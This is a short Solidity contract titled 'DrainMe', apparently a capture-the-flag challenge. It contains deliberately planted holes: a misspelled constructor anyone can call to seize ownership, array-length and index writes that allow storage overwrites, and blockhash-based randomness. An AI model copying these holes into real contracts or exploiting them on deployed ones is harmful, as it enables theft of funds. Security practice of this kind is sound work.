pragma solidity ^0.4.23;

contract DrainMe {

address public a = 0x0;
address public b;
address public c = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public d = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public e;

mapping(address=>bool) f;

uint256 public g;
uint256 public h;
uint256 public i;
uint256[] public j = [951828771,158769871220];
uint256[] public k;

function DranMe() public payable{
	b = msg.sender;
}

modifier l() {
    require(msg.sender == b);
    _;
}

modifier m() {
    require(msg.sender == a);
    _;
}

modifier n() {
    require(f[msg.sender]);
    _;
}

function o() public constant returns(uint256) {
	return j.length;
}

function p(uint256 q) public payable l{
	g = q;
}

function r() public constant returns(uint256) {
	return e.length;
}

function s() public constant returns(uint256) {
	return address(this).balance;
}

function t() public payable{
	require(msg.value >= 0.02 ether);
	e.push(msg.sender);
	f[msg.sender]=true;
}

function u() public payable n{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=b || v()){
	    uint256 w = 0;
        msg.sender.transfer(w);
	}
}

function v() private returns(bool){
    bytes32 x = keccak256(blockhash(block.number-1));
    uint256 y = uint256(x);
        if(y%5==0){
            a = msg.sender;
            return true;
        }
        else{
            return false;
        }
    }

function z() public payable n {
	require (msg.value >= 0.005 ether);
	c.call.value(msg.value)();
}

function A() public payable n {
	require (msg.value >= 0.005 ether);
	d.call.value(msg.value)();
}

function B(uint256 C, uint256 D) public payable n {
	j[C] = D;
}
	
function E(uint256 F) public payable n {
	j.length = F;
}

function G(uint256 H) public payable n returns(uint256) {
	return (H / (j[0]*j[1]));
	if((H / (j[0]*j[1])) == g) {
		b = a;
	}
}

function I() public payable n returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == g){
        return true;
    }
}

function J() public payable l {
	b.call.value(1 wei)();
}

function K() public payable m {
	a.transfer(address(this).balance);
}

function() public payable{
	}
}